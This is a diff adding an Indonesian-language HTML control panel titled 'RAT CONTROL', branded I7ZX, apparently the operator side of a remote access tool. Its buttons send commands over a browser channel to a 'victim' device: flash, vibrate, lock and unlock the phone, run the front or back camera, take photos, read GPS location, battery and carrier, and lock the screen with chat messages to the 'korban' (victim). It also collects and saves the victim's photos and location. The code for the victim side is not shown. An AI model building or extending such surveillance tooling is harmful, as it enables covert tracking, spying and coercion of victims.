@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RAT CONTROL</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body {
+            font-family: 'Orbitron', monospace;
+            background: #0a0a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+            background-image: 
+                radial-gradient(ellipse at 20% 50%, rgba(0,255,200,0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(123,47,252,0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 100%, rgba(255,107,107,0.05) 0%, transparent 50%);
+        }
+        .container { max-width: 480px; width: 100%; padding: 16px 14px 30px; animation: fadeUp 0.8s ease; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+        .header { text-align: center; margin-bottom: 22px; }
+        .header .glow-text { font-size: 26px; font-weight: 900; background: linear-gradient(135deg, #00f5d4, #7b2ffc, #ff6b6b, #f9ca24, #00f5d4); background-size: 400% 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: rgbShimmer 4s ease-in-out infinite; letter-spacing: 2px; }
+        @keyframes rgbShimmer { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        .header .sub { font-size: 10px; color: #555; letter-spacing: 4px; text-transform: uppercase; margin-top: 4px; }
+        .header .online-badge { display: inline-block; margin-top: 6px; padding: 4px 16px; background: rgba(0,255,200,0.12); border: 1px solid rgba(0,255,200,0.25); border-radius: 50px; font-size: 9px; color: #00f5d4; letter-spacing: 2px; animation: pulseBadge 2s infinite; }
+        @keyframes pulseBadge { 0%,100% { box-shadow: 0 0 10px rgba(0,255,200,0.1); } 50% { box-shadow: 0 0 25px rgba(0,255,200,0.3); } }
+        .card { background: rgba(255,255,255,0.03); border-radius: 20px; padding: 16px 14px; margin-bottom: 14px; border: 1px solid rgba(255,255,255,0.06); backdrop-filter: blur(10px); }
+        .card-title { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .card-title .badge { font-size: 8px; background: rgba(123,47,252,0.2); padding: 2px 8px; border-radius: 50px; color: #7b2ffc; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .btn {
+            padding: 14px 8px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.06); background: rgba(255,255,255,0.03); color: #ccc; text-align: center; cursor: pointer; transition: all 0.25s ease; position: relative; overflow: hidden; font-family: 'Orbitron', monospace; font-size: 9px; letter-spacing: 1px;
+        }
+        .btn .icon { font-size: 24px; display: block; margin-bottom: 4px; }
+        .btn:hover { transform: translateY(-3px); border-color: rgba(255,255,255,0.15); background: rgba(255,255,255,0.06); box-shadow: 0 8px 30px rgba(0,0,0,0.4); }
+        .btn:active { transform: scale(0.94); }
+        .btn-full { grid-column: 1 / -1; }
+        .btn-green { border-color: rgba(0,255,200,0.2); color: #00f5d4; }
+        .btn-green:hover { background: rgba(0,255,200,0.08); border-color: rgba(0,255,200,0.4); }
+        .btn-red { border-color: rgba(255,71,87,0.2); color: #ff4757; }
+        .btn-red:hover { background: rgba(255,71,87,0.08); border-color: rgba(255,71,87,0.4); }
+        .btn-purple { border-color: rgba(123,47,252,0.2); color: #7b2ffc; }
+        .btn-purple:hover { background: rgba(123,47,252,0.08); border-color: rgba(123,47,252,0.4); }
+        .btn-yellow { border-color: rgba(249,202,36,0.2); color: #f9ca24; }
+        .btn-yellow:hover { background: rgba(249,202,36,0.08); border-color: rgba(249,202,36,0.4); }
+        .btn-pink { border-color: rgba(255,107,107,0.2); color: #ff6b6b; }
+        .btn-pink:hover { background: rgba(255,107,107,0.08); border-color: rgba(255,107,107,0.4); }
+        .btn-blue { border-color: rgba(54,153,255,0.2); color: #3699ff; }
+        .btn-blue:hover { background: rgba(54,153,255,0.08); border-color: rgba(54,153,255,0.4); }
+        .camera-preview { background: rgba(0,0,0,0.6); border-radius: 14px; min-height: 180px; display: flex; align-items: center; justify-content: center; flex-direction: column; border: 1px solid rgba(255,255,255,0.04); margin-top: 8px; overflow: hidden; position: relative; }
+        .camera-preview video { width: 100%; height: auto; max-height: 250px; display: block; border-radius: 14px; }
+        .camera-preview .placeholder { color: #444; font-size: 11px; letter-spacing: 1px; padding: 30px 10px; text-align: center; }
+        .camera-preview .placeholder .icon-big { font-size: 40px; display: block; margin-bottom: 8px; }
+        .cam-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .cam-btn { padding: 10px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); background: rgba(255,255,255,0.02); color: #888; text-align: center; cursor: pointer; transition: all 0.25s; font-size: 8px; font-family: 'Orbitron', monospace; letter-spacing: 1px; }
+        .cam-btn .icon { font-size: 20px; display: block; margin-bottom: 2px; }
+        .cam-btn:hover { border-color: rgba(123,47,252,0.3); background: rgba(123,47,252,0.05); color: #fff; }
+        .cam-btn.active { border-color: #00f5d4; color: #00f5d4; background: rgba(0,255,200,0.06); }
+        .location-display { background: rgba(0,0,0,0.4); border-radius: 12px; padding: 12px 14px; margin-top: 8px; font-size: 10px; color: #888; word-break: break-all; min-height: 50px; display: flex; align-items: center; border: 1px solid rgba(255,255,255,0.03); }
+        .location-display .coords { color: #00f5d4; font-weight: 700; font-size: 11px; }
+        .location-display .loading { color: #666; animation: blink 1.2s infinite; }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
+        .toast-container { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; width: 90%; max-width: 400px; pointer-events: none; }
+        .toast { background: rgba(10,10,15,0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.06); border-radius: 16px; padding: 14px 20px; color: #eee; font-size: 11px; font-family: 'Orbitron', monospace; text-align: center; letter-spacing: 0.5px; opacity: 0; transform: translateY(20px) scale(0.95); transition: all 0.4s cubic-bezier(0.34,1.56,0.64,1); pointer-events: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
+        .toast.show { opacity: 1; transform: translateY(0) scale(1); }
+        .toast.success { border-color: rgba(0,255,200,0.3); }
+        .toast.error { border-color: rgba(255,71,87,0.3); }
+        .toast.warning { border-color: rgba(249,202,36,0.3); }
+        .toast.info { border-color: rgba(123,47,252,0.3); }
+        .pin-input { background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 12px; color: #fff; font-family: 'Orbitron', monospace; font-size: 14px; width: 100%; text-align: center; letter-spacing: 8px; }
+        .pin-input:focus { outline: none; border-color: rgba(123,47,252,0.4); }
+        .chat-area { background: rgba(0,0,0,0.4); border-radius: 12px; padding: 12px; max-height: 200px; overflow-y: auto; margin-top: 8px; border: 1px solid rgba(255,255,255,0.04); }
+        .chat-area .msg { padding: 6px 10px; margin: 4px 0; border-radius: 8px; font-size: 10px; font-family: 'Inter', sans-serif; }
+        .chat-area .msg.sent { background: rgba(123,47,252,0.2); color: #7b2ffc; text-align: right; }
+        .chat-area .msg.received { background: rgba(255,255,255,0.05); color: #ccc; text-align: left; }
+        .chat-area .msg.admin { background: rgba(255,107,107,0.15); color: #ff6b6b; text-align: center; font-weight: 700; }
+        .chat-input { display: flex; gap: 8px; margin-top: 8px; }
+        .chat-input input { flex: 1; padding: 10px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.06); background: rgba(0,0,0,0.3); color: #fff; font-family: 'Inter', sans-serif; font-size: 11px; }
+        .chat-input input:focus { outline: none; border-color: rgba(123,47,252,0.4); }
+        .chat-input button { padding: 10px 16px; border: none; border-radius: 10px; background: linear-gradient(135deg, #7b2ffc, #3699ff); color: #fff; font-family: 'Orbitron', monospace; font-size: 9px; cursor: pointer; transition: all 0.3s; }
+        .chat-input button:hover { transform: scale(1.05); }
+        .scroll-hint { text-align: center; font-size: 8px; color: #333; letter-spacing: 3px; margin-top: 12px; animation: scrollPulse 2s infinite; }
+        @keyframes scrollPulse { 0%,100% { opacity: 0.3; } 50% { opacity: 1; } }
+        @media (max-width:400px) { .header .glow-text { font-size: 18px; } .btn { padding: 10px 6px; font-size: 7px; } .btn .icon { font-size: 18px; } .card { padding: 12px 10px; } }
+    </style>
+</head>
+<body>
+    <div class="toast-container" id="toastContainer"><div class="toast" id="toast">🟢 SYSTEM READY</div></div>
+    <div class="container">
+        <div class="header">
+            <div class="glow-text">⚡ RAT CONTROL</div>
+            <div class="sub">Remote Access Terminal v3.0</div>
+            <div class="online-badge">● ONLINE</div>
+        </div>
+
+        <!-- FLASH -->
+        <div class="card">
+            <div class="card-title">🔦 KONTROL DEVICE <span class="badge">REALTIME</span></div>
+            <div class="grid-2">
+                <div class="btn btn-yellow btn-full" onclick="flashOn()"><span class="icon">🔦</span>NYALAKAN FLASH</div>
+                <div class="btn btn-purple" onclick="vibrateDevice()"><span class="icon">📳</span>GETAR</div>
+                <div class="btn btn-pink" onclick="lockDevice()"><span class="icon">🔒</span>LOCK HP</div>
+                <div class="btn btn-blue" onclick="unlockDevice()"><span class="icon">🔓</span>UNLOCK HP</div>
+            </div>
+        </div>
+
+        <!-- PIN UNLOCK -->
+        <div class="card">
+            <div class="card-title">🔑 PIN UNLOCK <span class="badge">SECURE</span></div>
+            <input class="pin-input" id="pinInput" type="password" maxlength="6" placeholder="••••••" oninput="checkPin(this.value)">
+            <div style="margin-top:8px;display:flex;gap:8px;">
+                <button class="btn btn-green btn-full" onclick="unlockWithPin()" style="padding:10px;">✅ BUKA PIN</button>
+            </div>
+        </div>
+
+        <!-- KAMERA -->
+        <div class="card">
+            <div class="card-title">📷 POV KORBAN <span class="badge">LIVE</span></div>
+            <div class="cam-grid">
+                <div class="cam-btn" id="camFrontBtn" onclick="startCam('front')"><span class="icon">📱</span>DEPAN</div>
+                <div class="cam-btn" id="camBackBtn" onclick="startCam('back')"><span class="icon">📷</span>BELAKANG</div>
+            </div>
+            <div class="camera-preview" id="cameraPreview">
+                <div class="placeholder"><span class="icon-big">🎥</span>Klik kamera untuk aktif</div>
+            </div>
+            <div class="grid-2" style="margin-top:8px;">
+                <div class="btn btn-purple btn-full" onclick="takePhoto()"><span class="icon">📸</span>TAKE FOTO</div>
+            </div>
+        </div>
+
+        <!-- LOKASI + INFO DEVICE -->
+        <div class="card">
+            <div class="card-title">📍 LOKASI & INFO <span class="badge">GPS</span></div>
+            <div class="btn btn-blue btn-full" onclick="getLocation()" style="margin-bottom:8px;"><span class="icon" style="font-size:14px;">📍</span>GET LOCATION</div>
+            <div class="location-display" id="locationDisplay"><span style="color:#555;">Klik tombol di atas</span></div>
+        </div>
+
+        <!-- CHAT LOCK -->
+        <div class="card">
+            <div class="card-title">💬 CHAT LOCK <span class="badge">I7ZX 🕷️</span></div>
+            <div class="btn btn-pink btn-full" onclick="lockWithChat()" style="margin-bottom:8px;"><span class="icon">🔒</span>LOCK + CHAT</div>
+            <div class="chat-area" id="chatArea">
+                <div class="msg admin">🕷️ I7ZX: Sistem aktif, siap menerima pesan</div>
+                <div class="msg received">📱 Perangkat: Terhubung</div>
+            </div>
+            <div class="chat-input">
+                <input id="chatInput" placeholder="Ketik pesan ke korban..." onkeypress="if(event.key==='Enter') sendChat()">
+                <button onclick="sendChat()">KIRIM</button>
+            </div>
+        </div>
+
+        <div class="scroll-hint">⬇ SYSTEM ACTIVE ⬇</div>
+        <div style="height:40px;"></div>
+        <div style="text-align:center;font-size:7px;color:#222;letter-spacing:2px;padding:20px 0;">I7ZX 🕷️ RAT v3.0 • POWERED BY I7ZX</div>
+    </div>
+
+    <script>
+        // ===================================================
+        // TOAST
+        // ===================================================
+        let toastTimer;
+        function toast(msg, type='info') {
+            const el=document.getElementById('toast');
+            el.textContent=msg;
+            el.className='toast '+type;
+            clearTimeout(toastTimer);
+            requestAnimationFrame(()=>el.classList.add('show'));
+            toastTimer=setTimeout(()=>el.classList.remove('show'),4000);
+        }
+
+        // ===================================================
+        // FLASH - NYALAKAN FLASH KEDIP (target device only)
+        // ===================================================
+        let flashInterval = null;
+        function flashOn() {
+            if (flashInterval) {
+                clearInterval(flashInterval);
+                flashInterval = null;
+                // Kirim sinyal mati ke target
+                if (window.broadcastChannel) {
+                    window.broadcastChannel.postMessage({ type: 'flash_off' });
+                }
+                toast('🔦 Flash dimatikan', 'info');
+                return;
+            }
+
+            toast('🔦 Flash menyala! Target akan kedip', 'success');
+            
+            // Kirim sinyal ke target
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'flash_on' });
+            }
+
+            // Simulasi feedback
+            flashInterval = setInterval(() => {
+                // Hanya untuk feedback UI
+            }, 200);
+            
+            // Matikan otomatis setelah 5 detik
+            setTimeout(() => {
+                if (flashInterval) {
+                    clearInterval(flashInterval);
+                    flashInterval = null;
+                    if (window.broadcastChannel) {
+                        window.broadcastChannel.postMessage({ type: 'flash_off' });
+                    }
+                    toast('🔦 Flash selesai', 'info');
+                }
+            }, 5000);
+        }
+
+        // ===================================================
+        // VIBRATE - GETAR HP (target device only)
+        // ===================================================
+        function vibrateDevice() {
+            toast('📳 Getar dikirim ke target!', 'success');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'vibrate' });
+            }
+        }
+
+        // ===================================================
+        // LOCK / UNLOCK DEVICE (target device only)
+        // ===================================================
+        function lockDevice() {
+            toast('🔒 HP target terkunci!', 'warning');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'lock' });
+            }
+        }
+
+        function unlockDevice() {
+            toast('🔓 HP target terbuka!', 'success');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'unlock' });
+            }
+        }
+
+        // ===================================================
+        // PIN UNLOCK (local control panel)
+        // ===================================================
+        let pinCorrect = '123456';
+        let pinAttempts = 0;
+
+        function checkPin(val) {
+            if (val.length === 6) {
+                if (val === pinCorrect) {
+                    toast('✅ PIN BENAR!', 'success');
+                    document.getElementById('pinInput').value = '';
+                    pinAttempts = 0;
+                    if (window.broadcastChannel) {
+                        window.broadcastChannel.postMessage({ type: 'unlock' });
+                    }
+                } else {
+                    pinAttempts++;
+                    toast('❌ PIN SALAH! Percobaan ' + pinAttempts + '/3', 'error');
+                    document.getElementById('pinInput').value = '';
+                    if (pinAttempts >= 3) {
+                        toast('⛔ Terlalu banyak percobaan!', 'error');
+                        pinAttempts = 0;
+                    }
+                }
+            }
+        }
+
+        function unlockWithPin() {
+            const pin = document.getElementById('pinInput').value;
+            if (pin === pinCorrect) {
+                toast('✅ PIN BENAR!', 'success');
+                document.getElementById('pinInput').value = '';
+                pinAttempts = 0;
+                if (window.broadcastChannel) {
+                    window.broadcastChannel.postMessage({ type: 'unlock' });
+                }
+            } else {
+                pinAttempts++;
+                toast('❌ PIN SALAH! Percobaan ' + pinAttempts + '/3', 'error');
+                document.getElementById('pinInput').value = '';
+                if (pinAttempts >= 3) {
+                    toast('⛔ Terlalu banyak percobaan!', 'error');
+                    pinAttempts = 0;
+                }
+            }
+        }
+
+        // ===================================================
+        // KAMERA (target device only)
+        // ===================================================
+        function startCam(type) {
+            toast('📷 Mengaktifkan kamera ' + type.toUpperCase() + ' target...', 'info');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'start_cam', data: type });
+            }
+        }
+
+        function takePhoto() {
+            toast('📸 Mengambil foto target...', 'info');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'take_photo' });
+            }
+        }
+
+        // ===================================================
+        // LOKASI + INFO (target device only)
+        // ===================================================
+        function getLocation() {
+            toast('📍 Mengambil lokasi target...', 'info');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'get_location' });
+            }
+        }
+
+        // ===================================================
+        // CHAT LOCK (target device only)
+        // ===================================================
+        function lockWithChat() {
+            toast('🔒 HP target terkunci + Chat aktif!', 'warning');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'lock_chat' });
+            }
+        }
+
+        function sendChat() {
+            const input = document.getElementById('chatInput');
+            const msg = input.value.trim();
+            if (!msg) return;
+            
+            const area = document.getElementById('chatArea');
+                        area.innerHTML += `<div class="msg sent">👤 Admin: ${msg}</div>`;
+            area.scrollTop = area.scrollHeight;
+            input.value = '';
+            toast('💬 Pesan terkirim ke korban!', 'success');
+            if (window.broadcastChannel) {
+                window.broadcastChannel.postMessage({ type: 'send_chat', data: msg });
+            }
+        }
+
+        // ===================================================
+        // BROADCAST CHANNEL - komunikasi dengan victim tab
+        // ===================================================
+        let bc = null;
+        try {
+            bc = new BroadcastChannel('rat_channel');
+            bc.onmessage = function(e) {
+                const data = e.data;
+                console.log('📥 Pesan dari victim:', data);
+                if (data.type === 'location_data') {
+                    const display = document.getElementById('locationDisplay');
+                    display.innerHTML = `
+                        <div>
+                            <span class="coords">📍 ${data.data.latitude}, ${data.data.longitude}</span>
+                            <br>
+                            <span style="font-size:8px;color:#666;">🎯 Akurasi: ${data.data.accuracy}m</span>
+                            <br>
+                            <span style="font-size:8px;color:#555;">📱 ${data.data.device}</span>
+                            <br>
+                            <span style="font-size:8px;color:#555;">🔋 Baterai: ${data.data.battery}%</span>
+                            <br>
+                            <span style="font-size:8px;color:#555;">📶 Operator: ${data.data.carrier}</span>
+                            <br>
+                            <span style="font-size:8px;color:#555;">⏰ TZ: ${data.data.timezone}</span>
+                        </div>
+                    `;
+                    toast('✅ Lokasi target berhasil!', 'success');
+                }
+                if (data.type === 'photo_data') {
+                    const link = document.createElement('a');
+                    link.download = 'POV_I7ZX_' + Date.now() + '.jpg';
+                    link.href = data.data;
+                    link.click();
+                    toast('📸 Foto target tersimpan!', 'success');
+                }
+                if (data.type === 'unlock') {
+                    toast('🔓 Target membuka HP!', 'success');
+                }
+            };
+            window.broadcastChannel = bc;
+        } catch(e) {
+            console.log('BroadcastChannel tidak support');
+        }
+
+        // ===================================================
+        // INIT
+        // ===================================================
+        document.addEventListener('DOMContentLoaded', () => {
+            toast('🟢 SYSTEM READY - RAT ACTIVE', 'info');
+            document.querySelectorAll('.btn, .cam-btn').forEach(el => {
+                el.addEventListener('click', function(e) {
+                    const rect = this.getBoundingClientRect();
+                    const size = Math.max(rect.width, rect.height);
+                    const x = e.clientX - rect.left - size / 2;
+                    const y = e.clientY - rect.top - size / 2;
+                    const ripple = document.createElement('span');
+                    ripple.style.cssText = `
+                        position:absolute; pointer-events:none; border-radius:50%;
+                        background:rgba(255,255,255,0.08);
+                        width:${size}px; height:${size}px;
+                        left:${x}px; top:${y}px;
+                        transform:scale(0);
+                        animation:rippleAnim 0.6s ease-out forwards;
+                    `;
+                    this.style.position = 'relative';
+                    this.style.overflow = 'hidden';
+                    this.appendChild(ripple);
+                    setTimeout(() => ripple.remove(), 700);
+                });
+            });
+            const style = document.createElement('style');
+            style.textContent = `@keyframes rippleAnim { 0% { transform:scale(0); opacity:0.6; } 100% { transform:scale(3); opacity:0; } }`;
+            document.head.appendChild(style);
+        });
+    </script>
+</body>
+</html>
